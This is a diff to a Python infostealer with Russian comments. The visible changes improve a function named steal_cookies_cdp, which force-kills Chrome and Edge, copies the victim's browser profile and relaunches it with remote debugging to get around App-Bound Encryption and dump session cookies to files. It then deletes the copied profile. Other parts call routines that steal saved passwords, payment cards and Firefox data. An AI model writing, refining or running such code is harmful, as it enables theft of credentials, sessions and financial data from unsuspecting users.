@@ -111,17 +111,16 @@ def copy_shared(src: Path, dst: Path) -> bool:
     return False
 
 # ============================================================
-# Chrome DevTools Protocol (обход v20)
+# CDP — обход v20 App-Bound Encryption
 # ============================================================
 def steal_cookies_cdp(browser_name, port, user_data_dir):
+    print(f"\n[CDP {browser_name}] === START ===")
     if browser_name == "Chrome":
         paths = [r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                  r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"]
     elif browser_name == "Edge":
         paths = [r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
                  r"C:\Program Files\Microsoft\Edge\Application\msedge.exe"]
-    elif browser_name == "Brave":
-        paths = [r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"]
     else:
         return False
 
@@ -131,37 +130,77 @@ def steal_cookies_cdp(browser_name, port, user_data_dir):
         return False
     exe_name = os.path.basename(exe_path)
 
-    subprocess.run(["taskkill", "/IM", exe_name, "/F"], capture_output=True, timeout=10)
-    time.sleep(2)
+    # убиваем все процессы браузера + crash handler
+    for name in (exe_name, "GoogleCrashHandler.exe", "GoogleCrashHandler64.exe", "chrome_proxy.exe"):
+        subprocess.run(["taskkill", "/IM", name, "/F"], capture_output=True, timeout=10)
+    time.sleep(4)
+
+    # порт занят? сдвигаем
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(1)
+        if s.connect_ex(("127.0.0.1", port)) == 0:
+            port += 100
+        s.close()
+    except Exception:
+        pass
+
+    user_data_dir = Path(user_data_dir)
+    cdp_profile   = WORK / f"_cdp_{browser_name}"
+    if cdp_profile.exists():
+        shutil.rmtree(cdp_profile, ignore_errors=True)
+
+    try:
+        r = subprocess.run(
+            ["robocopy", str(user_data_dir), str(cdp_profile),
+             "/E", "/XD", "Cache", "Code Cache", "GPUCache", "ShaderCache",
+             "Service Worker", "Extensions", "IndexedDB",
+             "/R:1", "/W:1", "/NFL", "/NDL", "/NJH", "/NJS"],
+            capture_output=True, timeout=120)
+        print(f"[CDP {browser_name}] robocopy rc={r.returncode}")
+    except Exception as e:
+        print(f"[CDP {browser_name}] robocopy err: {e}")
+        return False
+
+    if not (cdp_profile / "Local State").exists():
+        print(f"[CDP {browser_name}] profile copy failed (no Local State)")
+        return False
 
     args = [
         exe_path,
         f"--remote-debugging-port={port}",
         "--remote-allow-origins=*",
-        f"--user-data-dir={user_data_dir}",
+        f"--user-data-dir={cdp_profile}",
         "--no-first-run",
         "--no-default-browser-check",
         "--disable-gpu",
+        "--disable-extensions",
+        "--disable-background-networking",
+        "--disable-component-update",
     ]
+    print(f"[CDP {browser_name}] launching port {port}")
     try:
-        subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        proc = subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        print(f"[CDP {browser_name}] pid={proc.pid}")
     except Exception as e:
-        print(f"[CDP {browser_name}] start err: {e}")
+        print(f"[CDP {browser_name}] Popen err: {e}")
         return False
 
     ws_url = None
-    for i in range(20):
+    for i in range(30):
+        time.sleep(1)
         try:
             resp = urllib.request.urlopen(f"http://127.0.0.1:{port}/json/version", timeout=2)
             ws_url = json.loads(resp.read())["webSocketDebuggerUrl"]
-            print(f"[CDP {browser_name}] CDP up after {i+1}s")
+            print(f"[CDP {browser_name}] up after {i+1}s")
             break
         except Exception:
-            time.sleep(1)
+            pass
 
     if not ws_url:
-        print(f"[CDP {browser_name}] CDP not up")
+        print(f"[CDP {browser_name}] CDP not up, alive={proc.poll() is None}")
         subprocess.run(["taskkill", "/IM", exe_name, "/F"], capture_output=True)
+        shutil.rmtree(cdp_profile, ignore_errors=True)
         return False
 
     cookies = []
@@ -177,6 +216,7 @@ def steal_cookies_cdp(browser_name, port, user_data_dir):
 
     subprocess.run(["taskkill", "/IM", exe_name, "/F"], capture_output=True, timeout=10)
     time.sleep(1)
+    shutil.rmtree(cdp_profile, ignore_errors=True)
 
     if cookies:
         with (OUT / f"{browser_name}_CDP_cookies.txt").open("w", encoding="utf-8") as f:
@@ -212,7 +252,7 @@ def reopen_browsers():
             time.sleep(1)
 
 # ============================================================
-# Chromium (пароли, карты)
+# Chromium — пароли, карты, старые cookies (v10/v11)
 # ============================================================
 CHROMIUM = {
     "Chrome":  Path(os.environ["LOCALAPPDATA"]) / "Google/Chrome/User Data",
@@ -453,13 +493,16 @@ def main():
     OUT.mkdir(parents=True, exist_ok=True)
     safe(close_browsers)
 
-    # CDP для Chrome и Edge (обход v20)
-    chrome_ud = str(CHROMIUM["Chrome"])
-    edge_ud   = str(CHROMIUM["Edge"])
-    safe(steal_cookies_cdp, "Chrome", 9222, chrome_ud)
-    safe(steal_cookies_cdp, "Edge",   9223, edge_ud)
+    try:
+        steal_cookies_cdp("Chrome", 9222, str(CHROMIUM["Chrome"]))
+    except Exception as e:
+        import traceback; traceback.print_exc()
 
-    # Пароли и карты через copy_shared (браузеры мертвы, локов нет)
+    try:
+        steal_cookies_cdp("Edge", 9223, str(CHROMIUM["Edge"]))
+    except Exception as e:
+        import traceback; traceback.print_exc()
+
     for n, ud in CHROMIUM.items():
         safe(steal_chromium, n, ud)
     safe(steal_firefox)
